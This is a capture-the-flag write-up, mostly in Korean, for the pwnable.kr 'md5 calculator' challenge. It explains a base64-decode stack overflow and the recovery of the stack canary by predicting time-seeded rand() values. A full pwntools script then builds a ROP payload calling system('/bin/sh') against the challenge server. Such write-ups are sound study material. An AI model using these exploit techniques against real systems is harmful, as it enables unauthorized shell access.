# [pwnable.kr] md5 calculator

> We made a simple MD5 calculator as a network service.
> Find a bug and exploit it to get a shell.
>
> Download : http://pwnable.kr/bin/hash
> hint : this service shares the same machine with pwnable.kr web service
>
> Running at : nc pwnable.kr 9002
>
> [Attachment](./attachment)

## Bug

![image](https://github.com/user-attachments/assets/7df0091e-f3e1-4d24-8ff6-67b2b06b30c7)

`g_buf`에는 `0x400`바이트까지 입력할 수 있는데, 최대로 입력할 경우 base64 decode하면 `0x300`바이트가 된다. 하지만 decode한 문자열을 저장하는 `v3`의 size는 `0x200`이므로 stack buffer overflow가 발생할 수 있다.

## Exploit

### Leak canary

![image](https://github.com/user-attachments/assets/92d0bcaa-210b-47bf-98c6-9aa11f1ea27f)

Captcha는 `my_hash()`로 생성되는데,

![image](https://github.com/user-attachments/assets/dfe4524d-d882-42e4-8db9-2ce2b1a467dd)

`rand()`로 생성된 랜덤 값들과 canary를 조합해서 만들어진다.

`srand()`로 시드를 똑같이 현재 시각으로 설정해 주면 `rand()`의 반환값들을 모두 재현할 수 있기 때문에 captcha로부터 canary를 알아낼 수 있다.

### ROP

`process_hash()`의 return address를 덮어서 ROP를 할 수 있다. `g_buf`에 `"/bin/sh"`를 넣어서 사용하고, 바이너리에 포함된 `system()` 함수를 호출하여 shell을 획득할 수 있다.

### Full code

```python
# ex.py

from pwn import process, remote, p32, log, pause
from ctypes import CDLL
from base64 import b64encode

r = remote("pwnable.kr", 9002)

system_plt = 0x8048880  # PLT of system()
g_buf = 0x804B0E0  # g_buf


# generate random values

libc = CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")

libc.srand(libc.time(0))
v2 = libc.rand()
v3 = libc.rand()
v4 = libc.rand()
v5 = libc.rand()
v6 = libc.rand()
v7 = libc.rand()
v8 = libc.rand()
v9 = libc.rand()


# captcha

r.recvuntil(b"Are you human? input captcha : ")
captcha = r.recvline()[:-1]
r.sendline(captcha)


# leak canary

captcha = int(captcha)
canary = captcha - v6 + v8 - v9 - v4 + v5 - v3 - v7
while canary < 0:
    canary += 0x100000000
log.info("canary: " + hex(canary))


# ROP

payload = b"A" * 0x200
payload += p32(canary)
payload += b"A" * 0xC

# system("/bin/sh")
payload += p32(system_plt)  # return address of process_hash()
payload += b"A" * 0x4
payload += p32(g_buf + 0x3F8)  # address of "/bin/sh"

payload = b64encode(payload).ljust(0x3F8, b"A") + b"/bin/sh"

r.sendlineafter(b"Encode your data with BASE64 then paste me!\n", payload)


r.interactive()
```

![image](https://github.com/user-attachments/assets/ea219dcb-a9b2-496d-b6de-c8ac29aa7f14)
